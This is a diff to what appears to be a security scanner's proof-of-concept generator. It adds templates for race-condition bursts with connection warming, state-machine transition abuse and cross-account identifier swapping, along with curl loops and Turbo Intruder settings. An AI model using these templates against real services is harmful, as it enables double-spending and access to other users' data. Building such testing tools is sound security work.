@@ -10,6 +10,7 @@ Every PoC includes:
 """
 
 import json
+import re
 import shlex
 from urllib.parse import urlparse
 from .models import Finding, ProofOfConcept, ScanConfig
@@ -28,6 +29,8 @@ class PoCGenerator:
             return self._poc_price_manipulation(finding)
         elif "idor" in cat or "bola" in cat:
             return self._poc_idor(finding)
+        elif "cross-object" in cat or "cross object" in cat:
+            return self._poc_cross_object_confusion(finding)
         elif "mass assignment" in cat:
             return self._poc_mass_assignment(finding)
         elif "race" in cat:
@@ -36,6 +39,8 @@ class PoCGenerator:
             return self._poc_jwt(finding)
         elif "workflow" in cat:
             return self._poc_workflow_bypass(finding)
+        elif "state machine" in cat and finding.cwe == "CWE-841":
+            return self._poc_state_transition_abuse(finding)
         elif "state machine" in cat:
             return self._poc_state_machine(finding)
         elif "bfla" in cat or "function level" in cat or "privilege" in cat:
@@ -301,6 +306,26 @@ except Exception:
             video_note="Show the field in the request body, then show it reflected in the response. Then attempt to access an admin endpoint and show it succeeds.",
         )
 
+    def _extract_race_evidence(self, f: Finding) -> dict:
+        """
+        Pull the real numbers the oracle found (winning concurrency,
+        success/total ratio, distinct identifiers) out of the finding's
+        title/evidence text, so the generated PoC actually reflects what
+        was proven instead of a hardcoded "15 concurrent requests" guess.
+        """
+        text = f"{f.title} {f.evidence}"
+        concurrency_match = re.search(r"concurrency=(\d+)", text)
+        ratio_match        = re.search(r"(\d+)/(\d+)", text)
+        ids_match          = re.search(r"DISTINCT resource identifiers[^(]*\(([^)]+)\)", text)
+        cross_account       = "second account" in text.lower() or "different account" in text.lower()
+        return {
+            "concurrency": int(concurrency_match.group(1)) if concurrency_match else 15,
+            "success":     int(ratio_match.group(1)) if ratio_match else None,
+            "total":       int(ratio_match.group(2)) if ratio_match else None,
+            "distinct_ids": [s.strip() for s in ids_match.group(1).split(",")] if ids_match else [],
+            "cross_account": cross_account,
+        }
+
     def _poc_race_condition(self, f: Finding) -> ProofOfConcept:
         req = f.request
         url = req.get("url", "")
@@ -308,8 +333,21 @@ except Exception:
         body = req.get("body", {})
         token = self.config.auth_token
 
+        ev = self._extract_race_evidence(f)
+        n = ev["concurrency"]
+        oracle_note = (
+            f"# The scanner's oracle already confirmed {len(ev['distinct_ids'])} DISTINCT "
+            f"resource identifiers were created during the burst: {ev['distinct_ids']}\n"
+            f"# — i.e. this is a proven double-processing bug, not a status-code guess."
+            if ev["distinct_ids"] else
+            "# NOTE: the scanner saw multiple HTTP successes but could not extract a\n"
+            "# distinct resource identifier from the response body — re-confirm by\n"
+            "# checking the actual backend state (balance/stock/order count) below."
+        )
+
         python = self._python_script_header() + f'''
-# Race Condition PoC — uses threading for true concurrency
+# Race Condition PoC — reproduces the exact burst the scanner used
+# (connection-warmed, concurrency={n}) that already proved this finding.
 import threading
 import requests
 import json
@@ -320,9 +358,22 @@ HEADERS = {{
     "Content-Type": "application/json",
 }}
 BODY = {json.dumps(body, indent=4)}
+CONCURRENCY = {n}
+
+{oracle_note}
 
 results = []
 lock = threading.Lock()
+
+def warm_up():
+    """Pre-open connections so the real burst below reuses established
+    keep-alive sockets instead of paying a fresh TCP/TLS handshake per
+    request — the same connection-warming technique the scanner uses."""
+    for _ in range(CONCURRENCY):
+        try:
+            requests.options(TARGET, headers=HEADERS, verify=False, timeout=5)
+        except Exception:
+            pass
 
 def send_request(idx):
     try:
@@ -334,59 +385,88 @@ def send_request(idx):
         with lock:
             results.append((idx, 0, str(e)))
 
-# Fire 15 concurrent requests simultaneously
-print("[*] Firing 15 concurrent requests...")
-threads = [threading.Thread(target=send_request, args=(i,)) for i in range(15)]
-
-# Start all threads as close together as possible
+print(f"[*] Warming {{CONCURRENCY}} connections...")
+warm_up()
+print(f"[*] Firing {{CONCURRENCY}} concurrent requests...")
+threads = [threading.Thread(target=send_request, args=(i,)) for i in range(CONCURRENCY)]
 for t in threads:
     t.start()
 for t in threads:
     t.join()
 
 successes = [r for r in results if r[1] in (200, 201)]
-print(f"\\n[RESULT] {{len(successes)}}/15 requests succeeded")
+print(f"\\n[RESULT] {{len(successes)}}/{{CONCURRENCY}} requests succeeded")
 
-if len(successes) > 1:
-    print("[!!!] RACE CONDITION CONFIRMED — multiple concurrent requests succeeded")
-    print("[!!!] This may allow double-spending, duplicate redemption, or bypassing single-use limits")
-    for idx, status, body_preview in successes:
-        print(f"  Thread {{idx}}: {{status}} — {{body_preview[:100]}}")
+# Pull out a resource/transaction identifier from each successful body if
+# present, and count DISTINCT ones — that's what actually proves separate
+# mutations were committed, rather than one transaction echoed back N times.
+import re as _re
+ids = set()
+for _, status, body_preview in successes:
+    for m in _re.finditer(r'"(?:id|transaction_id|order_id|reference)"\\s*:\\s*"?([\\w-]+)"?', body_preview):
+        ids.add(m.group(1))
+
+if len(ids) > 1:
+    print(f"[!!!] RACE CONDITION CONFIRMED — {{len(ids)}} DISTINCT identifiers created: {{ids}}")
+elif len(successes) > 1:
+    print("[!] Multiple HTTP successes but identifiers matched/were not found —")
+    print("[!] verify actual backend state (balance/stock) before reporting as Critical")
 else:
-    print("[-] Only 1 or fewer requests succeeded — may not be vulnerable (or timing needs adjustment)")
-    print("[-] Try reducing system load and re-running, or use Turbo Intruder in Burp Suite")
+    print("[-] Only 1 or fewer requests succeeded on this run — race windows can be timing-")
+    print("[-] sensitive; the scanner already confirmed this once, try re-running a few times")
 '''
 
         steps = [
-            "1. Set up a redeemable resource (coupon code, one-time token, limited offer)",
-            f"2. Prepare 15 identical {method} requests to {url} with the same payload",
-            "3. Send all requests simultaneously (use Burp Suite → Turbo Intruder → 'race-single-packet-attack')",
-            "4. Observe that more than one request returns HTTP 200/201",
-            "5. Check the backend — the resource should have been consumed multiple times",
-            "6. Example with Turbo Intruder: use the 'examples/race-single-packet.py' template",
+            f"1. Identify the single-use resource at {url} (coupon, withdrawal, redemption, etc.)",
+            f"2. Fire {n} near-simultaneous {method} requests with the same payload — warm connections first "
+            "(OPTIONS/HEAD to the same host) to minimize TCP/TLS handshake jitter before the timed burst",
+            f"3. Confirm more than 1 of {n} requests returned success",
+            "4. Extract the resource identifier from each successful response and confirm they are DISTINCT "
+            "(proves separate mutations, not one transaction echoed back)",
+            "5. Cross-check actual backend state (balance/stock/order count) against what a single request should have produced",
         ]
+        if ev["cross_account"]:
+            steps.append(
+                "6. Repeat the burst from a second account/session — the scanner found the same "
+                "race succeeds cross-account, indicating any lock in place isn't even scoped per-account"
+            )
 
         burp_note = (
             "# Burp Suite Turbo Intruder config:\n"
             "# 1. Send request to Turbo Intruder\n"
             "# 2. Use script: examples/race-single-packet.py\n"
-            "# 3. Set concurrentConnections=1, requestsPerConnection=15\n"
+            f"# 3. Set concurrentConnections=1, requestsPerConnection={n}\n"
             "# 4. Click Attack\n\n"
         ) + self._burp_request(method, url, body)
 
+        distinct_note = (
+            f" Confirmed via {len(ev['distinct_ids'])} distinct resource identifiers "
+            f"({', '.join(ev['distinct_ids'][:5])})."
+            if ev["distinct_ids"] else ""
+        )
+
         return ProofOfConcept(
-            summary=f"Multiple concurrent identical requests succeed — one-time operation executed multiple times",
+            summary=(
+                f"{ev['success']}/{ev['total']} concurrent requests succeeded at concurrency={n}"
+                f"{distinct_note}"
+                if ev["success"] else
+                "Multiple concurrent identical requests succeed — one-time operation executed multiple times"
+            ),
             curl_command=(
-                f"# Run this in bash to fire parallel requests:\n"
-                f"for i in $(seq 1 15); do\n"
+                f"# Run this in bash to fire parallel requests (concurrency={n}, matching the scanner's finding):\n"
+                f"for i in $(seq 1 {n}); do\n"
                 f"  {self._curl_base(method, url, body)} &\n"
                 f"done\nwait\necho 'Done'"
             ),
             python_script=python,
             burp_request=burp_note,
-            expected_result=f"More than 1 of the 15 concurrent requests returns HTTP 200/201. The resource (coupon, credit, etc.) is consumed multiple times.",
+            expected_result=(
+                f"More than 1 of the {n} concurrent requests returns HTTP 200/201, with DISTINCT resource "
+                "identifiers across the successful responses — confirming the resource (coupon, credit, etc.) "
+                "was consumed/created multiple times, not just that the HTTP layer said 200 twice."
+            ),
             steps=steps,
-            video_note="Use screen recording. Show the concurrent requests in Burp Turbo Intruder, then show the backend reflecting multiple successful redemptions.",
+            video_note="Use screen recording. Show the concurrent requests firing, then show the backend reflecting multiple successful, distinctly-identified redemptions.",
         )
 
     def _poc_jwt(self, f: Finding) -> ProofOfConcept:
@@ -579,6 +659,136 @@ except Exception:
             expected_result="The state field in the response reflects the forced value. Business logic that depends on this state (shipping, access, payment) proceeds as if conditions were met.",
             steps=steps,
             video_note="Show the object's initial state, send the forced request, show the state change in the response, then show downstream impact.",
+        )
+
+    def _poc_state_transition_abuse(self, f: Finding) -> ProofOfConcept:
+        """
+        PoC for the flow-based state-transition fuzzer (attack_state_transitions,
+        CWE-841). Unlike _poc_state_machine (which forces a single field on one
+        request), this finding's exploit is "complete the flow up to step A, then
+        invoke step B directly" — a genuinely different reproduction narrative
+        (multi-step, not single-request), so it needs its own template.
+        """
+        req = f.request
+        url = req.get("url", "")
+        method = req.get("method", "POST")
+        body = req.get("body", {})
+        token = self.config.auth_token
+
+        python = self._python_script_header() + f'''
+# State-Machine Transition Abuse PoC
+# The scanner proved this by executing the flow up to an earlier/prior
+# state, then invoking THIS step directly — a transition the intended
+# workflow does not allow at that point (going backward, replaying a
+# terminal action, or skipping ahead).
+TARGET = "{url}"
+HEADERS = {{
+    "Authorization": "Bearer {token}",
+    "Content-Type": "application/json",
+}}
+BODY = {json.dumps(body, indent=4)}
+
+# 1. Run the legitimate flow up to the state described in the finding's
+#    evidence (see "State after '<step>'" in the evidence text) — do NOT
+#    complete the step that would naturally lead here.
+# 2. Then invoke this step directly:
+r = session.request("{method}", TARGET, json=BODY, headers=HEADERS)
+print(f"[STATE TRANSITION] Status: {{r.status_code}}")
+print(f"[RESPONSE] {{r.text[:500]}}")
+
+if r.status_code in (200, 201):
+    print("\\n[!!!] STATE MACHINE ABUSE CONFIRMED")
+    print("[!!!] This transition succeeded from a state that should not permit it")
+'''
+
+        steps = [
+            "1. Re-run the legitimate multi-step flow this endpoint belongs to, stopping "
+            "at the state described in the finding's evidence ('State after ...')",
+            f"2. From that state, invoke this step directly: {method} {url}",
+            "3. Observe the server processes it (HTTP 200/201) despite the intended flow "
+            "not permitting this transition at that point",
+            "4. Confirm with a canary request (garbage body) that the endpoint isn't simply "
+            "accepting everything — it should reject the canary but accept the real payload",
+            "5. Check for real downstream impact (double refund, re-opened ticket, "
+            "state reverted after a dependent action already happened, etc.)",
+        ]
+
+        return ProofOfConcept(
+            summary=f.evidence[:200],
+            curl_command=self._curl_base(method, url, body),
+            python_script=python,
+            burp_request=self._burp_request(method, url, body),
+            expected_result=(
+                "The transition succeeds even though it is reachable only by violating the "
+                "intended state graph (a backward transition, a replay of a single-use action, "
+                "or a forward skip) — see the finding evidence for the exact prior state."
+            ),
+            steps=steps,
+            video_note="Show the flow reaching the prior state, then show this step still succeeding when it should be blocked.",
+        )
+
+    def _poc_cross_object_confusion(self, f: Finding) -> ProofOfConcept:
+        """
+        PoC for attack_cross_instance_confusion findings — a class the router
+        previously had no dedicated builder for at all (it silently fell
+        through to _poc_generic, which just replays one request and gives no
+        explanation of the two-instance setup a hunter actually needs).
+        """
+        req = f.request
+        url = req.get("url", "")
+        method = req.get("method", "POST")
+        body = req.get("body", {})
+        token = self.config.auth_token
+
+        python = self._python_script_header() + f'''
+# Cross-Object State Confusion PoC
+# The scanner ran TWO independent instances of this flow (optionally under
+# two different accounts), then substituted an identifier extracted from
+# instance B into instance A's in-progress flow at this step — and the
+# server accepted it. This request already has that swapped identifier
+# baked in from the scan; re-running it against a FRESH pair of instances
+# is how you confirm it's reproducible, not a one-off race:
+TARGET = "{url}"
+HEADERS = {{
+    "Authorization": "Bearer {token}",
+    "Content-Type": "application/json",
+}}
+BODY = {json.dumps(body, indent=4)}
+
+r = session.request("{method}", TARGET, json=BODY, headers=HEADERS)
+print(f"[CROSS-OBJECT] Status: {{r.status_code}}")
+print(f"[RESPONSE] {{r.text[:500]}}")
+
+if r.status_code in (200, 201):
+    print("\\n[!!!] CROSS-OBJECT STATE CONFUSION CONFIRMED")
+    print("[!!!] An identifier from a SEPARATE flow instance was accepted here")
+'''
+
+        steps = [
+            "1. Start TWO independent instances of this flow (e.g. two separate orders/carts, "
+            "ideally under two different accounts) up to the step named in the finding evidence",
+            "2. Note the identifier(s) each instance's step returns (order id, coupon id, "
+            "session/cart token — see 'Swapped field(s)' in the evidence)",
+            "3. Continue instance A's flow to this step, but substitute in the identifier(s) "
+            "extracted from instance B",
+            f"4. Send: {method} {url} with the swapped identifier(s) in the body — the request below "
+            "already has this baked in from the scan",
+            "5. Confirm it succeeds (HTTP 200/201) — proving the server never verified the "
+            "identifier actually belonged to the account/session currently executing",
+        ]
+
+        return ProofOfConcept(
+            summary=f.evidence[:200],
+            curl_command=self._curl_base(method, url, body),
+            python_script=python,
+            burp_request=self._burp_request(method, url, body),
+            expected_result=(
+                "The step succeeds using an identifier that belongs to a completely separate "
+                "flow instance/account — proving the server does not bind extracted identifiers "
+                "to the session that created them."
+            ),
+            steps=steps,
+            video_note="Show two accounts each starting the flow, then show account A's request succeeding with account B's swapped-in identifier.",
         )
 
     def _poc_privilege_escalation(self, f: Finding) -> ProofOfConcept:
